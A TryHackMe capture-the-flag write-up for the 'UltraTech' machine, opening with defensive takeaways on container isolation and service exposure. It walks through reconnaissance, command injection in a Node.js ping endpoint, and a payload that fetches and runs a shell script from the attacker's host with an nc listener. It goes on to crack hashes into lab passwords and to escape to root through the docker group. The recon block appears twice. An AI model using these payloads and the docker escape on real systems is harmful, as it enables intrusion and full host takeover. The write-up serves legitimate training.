# ultratech1

<!-- brain:report -->
- **Platform** TryHackMe
- **Difficulty** Medium
- **Source status** Documented

## Report overview

The observations in this case inform a review of container runtime isolation and service and share exposure.

## Defensive takeaways

- Compare workload identities, runtime access, capabilities and mounts with the deployment policy.
- Confirm the intended audience for network services and shares, then compare their permissions and reachability with that policy.

## Defensive references

- [Container runtime and workload isolation](../../../defense/techniques/container-isolation.md)
- [Exposed service and share hardening](../../../defense/techniques/service-exposure-review.md)

<!-- /brain:report -->

---


**Platform:** TryHackMe  
**Difficulty:** Medium  
**Status:** Complete

## Reconnaissance

```bash
nmap -sS -p- $TARGET --min-rate 5000 -Pn -n -oN silent
nmap -sVC -p21,22,8081,31331 $TARGET -oN service
```

**Output**
```

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:2f:8c:4e:91:55:48:41:a6:7e:b2:36:07:6c:58:3e (RSA)
|   256 63:f1:8e:d2:89:e1:0e:2a:76:e7:13:e4:c7:90:c5:74 (ECDSA)
|_  256 c4:10:80:a9:aa:b1:3d:b1:92:c2:0a:fe:e9:02:da:00 (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.41 (Ubuntu)

```bash
nmap -sS -p- $TARGET --min-rate 5000 -Pn -n -oN silent
nmap -sVC -p21,22,8081,31331 $TARGET -oN service
```

**Output**
```

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:2f:8c:4e:91:55:48:41:a6:7e:b2:36:07:6c:58:3e (RSA)
|   256 63:f1:8e:d2:89:e1:0e:2a:76:e7:13:e4:c7:90:c5:74 (ECDSA)
|_  256 c4:10:80:a9:aa:b1:3d:b1:92:c2:0a:fe:e9:02:da:00 (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

---


## Web and API Fuzzing

```bash
# Web directory Fuzzing
feroxbuster -u http://$TARGET:31331 -w /usr/share/seclists/Discovery/Web-Content/big.txt
# API enumeration
feroxbuster -u http://$TARGET:8081 -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
```

**Output**
```
200      GET        1l        3w       20c http://10.128.177.252:8081/
200      GET        1l        8w       39c http://10.128.177.252:8081/auth
500      GET       10l       61w     1094c http://10.128.177.252:8081/ping
200      GET        1l        3w       20c http://10.128.177.252:8081/?:
```

### We can see how to use some of the api endpoints
> http://10.128.177.252:31331/js/api.js
```bash
sudo tcpdump -i tun0 icmp
curl 'http://10.128.177.252:8081/ping?ip=192.168.130.5'
```

### The Server Confirms the Endpoint Sends ICMP — Try Command Substitution
Full technique: [Node.js ping command injection](../../../exploits/web-rce/nodejs-ping-command-injection.md).

```bash
# Payloads
curl 'http://$TARGET:8081/ping?ip=localhost;%20$(id)'
python -m http.server 80
curl -G 'http://$TARGET:8081/ping' \
  --data-urlencode 'ip=localhost;`curl http://$LOHST/shell.sh -o /tmp/shell.sh`' 
# Execute
nc -lvnp 8080
curl -G 'http://$TARGET:8081/ping' \
  --data-urlencode 'ip=localhost;`bash /tmp/shell.sh`'
```

---

## Linux enumeration
```bash
strings utech.db.sqlite
```
**Output**
```
SQLite format 3
etableusersusers
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        )
r00tf357a0c52799563c7c7b76c1e7543a32)
admin0d0ea5111e3c1def594c1684e3b9be84
```

### Use https://crackstation.net/ to crack r00t hash
```
f357a0c52799563c7c7b76c1e7543a32:n100906
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy
```

### Connect with ssh 
```bash
ssh r00t@$TARGET
```

## Privilege Escalation
```bash
id
```

**Output**
```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

### The user r00t is in the docker group — Docker GTFOBins escape applies
https://gtfobins.org/gtfobins/docker/#shell
Full technique: [Docker group escape](../../../privesc/linux/docker-group-escape.md).

```bash
docker images
```
**Output**
```
bash         latest    495d6437fc1e   7 years ago   15.8MB
```

### Docker Privilege Escalation
```bash
docker run -v /:/mnt --rm -it 495d6437fc1e chroot /mnt /bin/sh
bash -p
cat id_rsa
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [strings](../../../tools/reversing/strings.md)
- [ssh](../../../tools/pivot/ssh.md)
- [docker](../../../tools/container/docker.md)
- [Node.js ping command injection](../../../exploits/web-rce/nodejs-ping-command-injection.md)
- [Docker group escape](../../../privesc/linux/docker-group-escape.md)



